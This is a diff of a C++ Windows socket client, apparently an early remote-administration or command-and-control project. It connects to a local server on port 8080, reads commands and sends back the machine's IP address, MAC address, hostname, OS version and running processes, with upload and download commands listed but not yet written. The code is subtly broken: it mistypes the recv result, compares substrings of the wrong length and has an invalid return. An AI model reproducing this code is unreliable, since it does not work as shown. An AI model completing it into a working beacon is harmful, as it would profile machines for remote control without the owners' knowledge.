@@ -13,6 +13,7 @@
 #include <Psapi.h>
 #include <locale>
 #include <tchar.h>
+#include <algorithm>
 
 #pragma comment(lib, "WS2_32")
 #pragma comment(lib, "iphlpapi.lib")
@@ -31,13 +32,6 @@ void getComputerName() {
         cout << "Could not get hostname, error: " << GetLastError << endl;
     }
 }
-
-int getHostname()
-{
-    getComputerName();
-    return 0;
-}
-
 
 string getIpAddress()
 {
@@ -179,83 +173,163 @@ vector<wstring> getRunningProcesses()
 
 int main(int argc, char* arg[]) {
 
-	//Setting up DLL
+    //Setting up DLL
 
-	SOCKET clientSocket;
-	int port = 8080;
-	WSADATA wsaData;
-	int wsaerr;
+    SOCKET clientSocket;
+    int port = 8080;
+    WSADATA wsaData;
+    int wsaerr;
 
-	WORD wVersionRequested = MAKEWORD(2, 2);
-	wsaerr = WSAStartup(wVersionRequested, &wsaData);
-	if (wsaerr != 0) {
-		cout << "The Winsock dll was not found" << endl;
-		return 0;
-	}
-	else {
-		cout << "The Winsock dll was found!" << endl;
-		cout << "The status" << wsaData.szSystemStatus << endl;
-	}
-
-	//Setting up the client socket
-
-	clientSocket = INVALID_SOCKET;
-	clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	if (clientSocket == INVALID_SOCKET) {
-		cout << "Error at socket: " << WSAGetLastError() << endl;
-		WSACleanup();
-		return 0;
-	}
-	else {
-		cout << "Socket() is working..." << endl;
-	}
-
-	//Connecting to the server
-	sockaddr_in clientService;
-	clientService.sin_family = AF_INET;
-	InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
-	clientService.sin_port = htons(port);
-	if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
-		cout << "Error at connect(): Failed to connect" << endl;
-		WSACleanup();
-		return 0;
-	}
-	else {
-		cout << "Client connection is working!" << endl;
-		cout << "The client can now start to send and recieve data from the server..." << endl;
-
-	}
-
-	//Send message to the server
-
-	char buffer[200] = "Hello World";
-
-	int byteCount = send(clientSocket, buffer, 200, 0);
-
-	if (byteCount > 0) {
-		cout << "Message sent... - " << buffer << endl;
-	}
-	else {
-		WSACleanup();
-	}
-
-    string ip = getIpAddress();
-    int byteCount = send(clientSocket, ip, 200, 0);
-
-    if (byteCount > 0) {
-        cout << "Message sent... - " << buffer << endl;
+    WORD wVersionRequested = MAKEWORD(2, 2);
+    wsaerr = WSAStartup(wVersionRequested, &wsaData);
+    if (wsaerr != 0) {
+        cout << "The Winsock dll was not found" << endl;
+        return 0;
     }
     else {
-        WSACleanup();
+        cout << "The Winsock dll was found!" << endl;
+        cout << "The status" << wsaData.szSystemStatus << endl;
     }
 
-	//Close the socket
-	system("pause");
-	WSACleanup();
+    //Setting up the client socket
+
+    clientSocket = INVALID_SOCKET;
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET) {
+        cout << "Error at socket: " << WSAGetLastError() << endl;
+        WSACleanup();
+        return 0;
+    }
+    else {
+        cout << "Socket() is working..." << endl;
+    }
+
+    //Connecting to the server
+    sockaddr_in clientService;
+    clientService.sin_family = AF_INET;
+    InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
+    clientService.sin_port = htons(port);
+    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
+        cout << "Error at connect(): Failed to connect" << endl;
+        WSACleanup();
+        return 0;
+    }
+    else {
+        cout << "Client connection is working!" << endl;
+        cout << "The client can now start to send and recieve data from the server..." << endl;
+
+    }
+
+    //Get command from the server
+    //Commands:
+    //IPADDRESS:            IP
+    //USERNAME:             US
+    //MACADDRESS:           MA
+    //OS VERSION:           OS
+    //RUNNING PROCESSES:    PR
+    //UPLOAD:               UP
+    //DOWNLOAD:             DO
+
+    char recvbuf[200];
+
+    //Not sure what to do here
+    string serverCommand = recv(clientSocket, recvbuf, 200, 0);
+
+
+    cout << "Server Command: ";
+    transform(serverCommand.begin(), serverCommand.end(), serverCommand.begin(), toupper);
+
+    //Send message to the server
+    if (serverCommand.substr(0, 1) == "IP") {
+
+        //Send IP Address
+
+        string ipAddress = getIpAddress();
+        if (ipAddress != "") {
+            const char* msg = ipAddress.c_str();
+            int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+            if (bytesSent == SOCKET_ERROR) {
+                cout << "Error at send(): " << WSAGetLastError() << endl;
+                WSACleanup();
+                return 0;
+            }
+            else {
+                cout << "Message sent to server: " << msg << endl;
+            }
+        }
+    }
+    else if (serverCommand.substr(0, 1) == "MA") {
+
+        //Send MAC Address
+
+        string MacAddress = getMacAddress();
+        if (MacAddress != "") {
+            const char* macmsg = MacAddress.c_str();
+            int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
+            if (bytesSent == SOCKET_ERROR) {
+                cout << "Error at send(): " << WSAGetLastError() << endl;
+                WSACleanup();
+                return 0;
+            }
+            else {
+                cout << "Message sent to server: " << macmsg << endl;
+            }
+        }
+    }
+    else if (serverCommand.substr(0, 1) == "US") {
+
+        //Send Hostname
+
+        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+        DWORD size = sizeof(hostname) / sizeof(char);
+
+        if (GetComputerNameA(hostname, &size)) {
+            cout << "Message sent to server: " << hostname << endl;
+            send(clientSocket, hostname, strlen(hostname), 0);
+        }
+        else {
+            cout << "Could not send hostname. Error: " << GetLastError << endl;
+        }
+    }
+    else if (serverCommand.substr(0, 1) == "OS") {
+
+        //Send OS Version
+
+        string osMessage = getOS();
+        int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
+        if (bytesSent == SOCKET_ERROR) {
+            cout << "Error while sending OS: " << WSAGetLastError() << endl;
+        }
+        else {
+            cout << "Message sent to server: " << osMessage << endl;
+        }
+    }
+    else if (serverCommand.substr(0, 1) == "PR") {
+
+        //Send Running Processes
+
+        vector<wstring> processes = getRunningProcesses();
+        string result = "Running processes: \n";
+        for (const auto& process : processes) {
+            result += string(process.begin(), process.end()) + "\n";
+        }
+
+        int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
+        if (bytesSent == SOCKET_ERROR) {
+            cout << "Error while sending running processes: " << WSAGetLastError() << endl;
+            WSACleanup();
+            return;
+        }
+    }    
+    
+    
+
+    //Close the socket
+    system("pause");
+    WSACleanup();
 
 
     //Add these so that they send messages
-    getHostname();
     cout << "IP address: " << getIpAddress() << endl;
     cout << "MAC address: " << getMacAddress() << endl;
     cout << "OS: " << getOS() << endl;
@@ -266,5 +340,5 @@ int main(int argc, char* arg[]) {
         wcout << process << endl;
     }
 
-	return 0;
+    return 0;
 }
